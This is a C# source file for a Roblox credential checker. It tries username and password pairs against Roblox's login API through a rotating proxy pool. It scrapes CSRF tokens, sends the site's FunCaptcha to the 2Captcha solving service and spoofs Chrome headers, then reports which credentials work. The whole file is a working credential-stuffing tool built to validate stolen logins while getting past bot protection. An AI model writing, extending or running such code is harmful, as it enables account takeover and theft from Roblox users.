using System.Net;
using System.Net.Http.Headers;
using System.Text.RegularExpressions;
using Core.Checkers.Abstractions;
using Core.Checkers.Extensions;
using Core.Models;
using Newtonsoft.Json;
using TwoCaptcha.Captcha;
using TwoCaptcha.Exceptions;

namespace Core.Checkers;

public class RobloxChecker : ICredentialsChecker<bool?>
{
    private readonly ProxyPool _proxy;
    private readonly TwoCaptcha.TwoCaptcha _captcha;

    public RobloxChecker(ProxyPool proxy, TwoCaptcha.TwoCaptcha captcha)
    {
        _proxy = proxy;
        _captcha = captcha;
    }
    
    public async Task<bool?> TryLoginAsync(string login, string password)
    {
        using var http = await _proxy.TakeClient();
        var body = await GetBody(http);
        var request = CreateRequest("https://auth.roblox.com/v2/login", HttpMethod.Post);
        request.Headers.Add("origin", "https://www.roblox.com");
        request.Headers.Add("x-csrf-token", body.GetMetaValue(contentname: "data-token"));
        request.Content = new StringContent(
            JsonConvert.SerializeObject(new
            {
                cvalue = login,
                ctype = "Username",
                password,
                challengeId = await SolveCaptcha(http, body)
            }), new MediaTypeHeaderValue("application/json"));

        var response = await http.SendAsync(request);
        
        // todo add content error handler

        return response.StatusCode switch
        {
            (HttpStatusCode) 200 => true,
            (HttpStatusCode) 400 => false,
            (HttpStatusCode) 403 => false,
            (HttpStatusCode) 302 => null,
            _ => null
        };
    }

    private static readonly Regex _findSiteKey = new("\"PublicKey\":\"(.*?)\"");
    private async Task<string> SolveCaptcha(HttpClient http, string body)
    {
        var captcha = new FunCaptcha();
        var publikkey = await body.FindRegex(_findSiteKey);
        captcha.SetSiteKey(publikkey);
        captcha.SetUrl("https://www.roblox.com/login");
        captcha.SetSUrl(await GetSUrl(http, body, publikkey));
        captcha.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36");
        captcha.SetProxy("HTTP", await _proxy.TakeProxyString());

        try
        {
            await _captcha.Solve(captcha);
        }
        catch (Exception e)
        {
            Console.WriteLine("Error occurred: " + e.Message);
        }


        return captcha.Code;
    }

    private async Task<string> GetSUrl(HttpClient http, string body, string publikkey)
    {
        var request = CreateRequest($"https://roblox-api.arkoselabs.com/v2/{publikkey}/api.js", HttpMethod.Post);
        var response =  await http.SendAsync(request);

        var content = await response.Content.ReadAsStringAsync();

        return content;
    }

    private async Task<string> GetBody(HttpClient http)
    {
        var request = CreateRequest("https://www.roblox.com/login", HttpMethod.Get);

        var response = await http.SendAsync(request);
        var content = await response.Content.ReadAsStringAsync();
        
        if (response.StatusCode != (HttpStatusCode) 200) throw new NetworkException($"Invalid response status code by request on \"https://www.roblox.com/\"\n{content}");

        return content;
    }

    private static HttpRequestMessage CreateRequest(string url, HttpMethod method) => new (method, url)
    {
        Headers =
        {
            { "referer", "https://www.roblox.com/" },
            { "sec-ch-ua", " Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\""},
            { "sec-ch-ua-mobile", "?0" },
            { "sec-ch-ua-platform", "Windows" },
            { "sec-fetch-dest", "document" },
            { "sec-fetch-mode", "navigate" },
            { "sec-fetch-site", "same-origin" },
            { "sec-fetch-user", "?1" },
            { "upgrade-insecure-requests", "1" },
            { "user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" }
        },
    };
}